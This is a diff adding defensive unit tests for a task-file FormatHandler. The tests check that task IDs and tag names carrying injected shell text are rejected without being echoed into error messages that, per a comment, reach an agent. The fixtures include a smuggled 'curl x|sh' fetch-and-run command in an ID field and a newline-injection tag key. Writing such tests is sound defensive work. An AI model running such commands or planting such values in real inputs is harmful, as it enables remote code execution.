@@ -38,3 +38,53 @@ describe('FormatHandler tasks and metadata keys (#802)', () => {
 		expect(handler.extractTasks(data, 'master')).toEqual([{ id: '1' }]);
 	});
 });
+
+describe('FormatHandler stored IDs and tag names', () => {
+	const handler = new FormatHandler();
+	const bad = '1;curl x|sh;:\n2';
+	const read = (task: unknown) => () =>
+		handler.extractTasks({ master: { tasks: [task] } }, 'master');
+
+	it('reads numeric IDs in either form', () => {
+		const task = {
+			id: 3,
+			subtasks: [{ id: 1 }, { id: '3.2' }]
+		};
+
+		expect(read(task)()).toHaveLength(1);
+	});
+
+	it.each([
+		['a task ID', { id: bad }],
+		['a task ID with a dot too many', { id: '1.2.3' }],
+		['a surrounding newline', { id: '\n1\n' }],
+		['a subtask ID', { id: 1, subtasks: [{ id: bad }] }]
+	])('refuses %s without repeating it', (_what, task) => {
+		// session-start.sh hands prime's error text to the agent
+		expect(read(task)).toThrow(/isn't a number/);
+		try {
+			read(task)();
+		} catch (error) {
+			expect((error as Error).message).not.toContain('curl');
+		}
+	});
+
+	it('leaves tag keys out when they are not safe to print', () => {
+		const data = {
+			master: { tasks: [] },
+			'x\nrun this;': { tasks: [] },
+			'feature-1': { tasks: [] },
+			'a/b.c': { tasks: [] }
+		};
+
+		expect(handler.extractTags(data)).toEqual(['master', 'feature-1', 'a/b.c']);
+	});
+
+	it('does not read master from a tag that is not safe to print', () => {
+		const data = { 'x\nrun this;': { tasks: [{ id: 1 }] } };
+
+		expect(handler.detectFormat(data)).toBe('legacy');
+		expect(handler.extractTasks(data, 'master')).toEqual([]);
+		expect(handler.extractMetadata(data, 'master')).toBe(null);
+	});
+});
